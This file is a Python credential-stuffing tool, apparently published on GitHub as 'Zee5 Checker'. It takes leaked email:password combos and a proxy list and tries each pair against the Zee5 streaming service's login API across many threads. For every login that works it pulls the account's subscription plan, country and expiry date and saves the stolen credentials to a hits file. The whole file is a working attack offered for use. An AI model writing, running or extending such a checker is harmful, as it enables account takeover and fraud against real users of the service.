import os, requests, string, random, time, threading
from colorama import Fore

lock = threading.Lock()

class Zee5:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.retries = 0
        self.proxies = open("data/proxies.txt", "r", encoding="utf8").read().splitlines()
        self.combos = open("data/combos.txt", "r", encoding="utf8").read().splitlines()

    def ui(self):
        os.system("cls && title Zee5 Checker ^| github.com/Plasmonix")
        print(f"""{Fore.BLUE}                                                                          
         _____         ___    _____ _           _           
        |__   |___ ___|  _|  |     | |_ ___ ___| |_ ___ ___ 
        |   __| -_| -_|_  |  |   --|   | -_|  _| "_| -_|  _|
        |_____|___|___|___|  |_____|_|_|___|___|_,_|___|_|        
        {Fore.RESET}""")

    def updateTitle(self):
        while True:
            self.timenow = time.strftime("%H:%M:%S", time.localtime())
            os.system(f"title Zee5 Checker - Checked: {self.checked}/{len(self.combos)} ^| Hits: {self.hits} ^| Bad: {self.bad} ^| Retries: {self.retries}")
            time.sleep(0.4)

    def checker(self, combo):
        for i in combo:
            try:
                session = requests.Session()
                email, password = i.split(":", 2)
                session.headers = {"content-type": "application/json", "Connection": "keep-alive", "Accept": "*/*", "Accept-Language": "en-us", "Accept-Encoding": "gzip, deflate, br", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36"}
                proxy = [{"https": "http://"+proxy} for proxy in self.proxies]
                token = ''.join(random.choices(string.ascii_letters, k=20))
                response = session.post("https://whapi.zee5.com/v1/user/loginemail_v2.php", json={"email": email, "password":password, "aid":"91955485578", "lotame_cookie_id":"", "guest_token":f"{token}000000000000", "platform":"web", "version":"2.51.63"}, proxies=random.choice(proxy), timeout=10)
                
                if "access_token" in response.text:
                    data = session.get("https://subscriptionapiv2.zee5.com/v1/purchaseplan?translation=en&country=IN&system=Z5&additionalDetails=1&platform_name=web_app", proxies=random.choice(proxy), timeout=10).json()
                    country = data["country"]
                    plan = data["billing_type"]
                    expire = data["end"].split("T")[0]
                    lock.acquire()
                    print(f"[{Fore.BLUE}{self.timenow}{Fore.RESET}] {Fore.BLUE}HIT{Fore.RESET} | {email} | {password} | {country} | {plan} | {expire}")
                    with open("hits.txt", "a", encoding="utf-8") as fp:
                        fp.writelines(f'Email: {email} Password: {password} - Plan: {plan} - Country: {country} - Validity: {expire}\n')   
                    self.hits += 1
                    self.checked += 1
                    lock.release()

                elif "The email address and password combination was wrong during login." in response.text:
                        lock.acquire()
                        print(f"[{Fore.BLUE}{self.timenow}{Fore.RESET}] {Fore.RED}BAD{Fore.RESET} | {email} | {password} ")
                        self.bad += 1
                        self.checked += 1
                        lock.release()
            except:
                lock.acquire()
                print(f"[{Fore.BLUE}{self.timenow}{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Failed to connect. Proxy exhausted")
                self.retries += 1
                lock.release()
    
    def worker(self, slice):
        return [slice[i::self.threadcount] for i in range(self.threadcount)]
    
    def main(self):
        self.ui()
        self.threadcount = int(input(f"{Fore.BLUE}>{Fore.RESET} Threads: "))
        self.ui()
        threading.Thread(target=self.updateTitle).start()
        threads = []
        for i in range(self.threadcount):
            threads.append(threading.Thread(target=self.checker, args=[self.worker(self.combos)[i]]))
            threads[i].start()
        for thread in threads:
            thread.join()
        
if __name__ == "__main__":
   Zee5().main()
